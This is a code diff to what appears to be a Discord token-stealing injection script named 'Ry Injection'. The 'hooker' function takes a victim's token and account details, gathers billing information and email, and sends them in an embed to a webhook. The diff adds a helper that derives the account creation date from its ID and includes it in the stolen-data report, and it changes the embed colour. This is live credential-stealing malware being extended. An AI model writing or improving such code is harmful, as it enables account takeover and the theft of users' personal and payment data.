@@ -83,6 +83,13 @@ const request = async (method, url, headers, data) => {
   });
 };
 
+const getCreationDate = (id) => {
+  const binary = BigInt(id).toString(2).padStart(64, '0');
+  const timestamp = parseInt(binary.substring(0, 42), 2) + 1420070400000;
+  const date = new Date(timestamp);
+  return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
+};
+
 const hooker = async (content, token, account) => {
   content["username"] = "Ry Injection";
   content["avatar_url"] = "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&";
@@ -98,6 +105,7 @@ const hooker = async (content, token, account) => {
 
   const billing = await getBilling(token);
   const email = account.email;
+  const creationDate = getCreationDate(account.id);
 
   content["embeds"][0]["fields"].push(
     {
@@ -114,11 +122,16 @@ const hooker = async (content, token, account) => {
       name: "<:billing:1240636353364889700> Billing",
       value: billing,
       inline: true,
+    },
+    {
+      name: "Creation Date",
+      value: `\`${creationDate}\``,
+      inline: true,
     }
   );
 
   for (const embed in content["embeds"]) {
-    content["embeds"][embed]["color"] = 0x000;
+    content["embeds"][embed]["color"] = 0x323238;
   }
 
   await request(
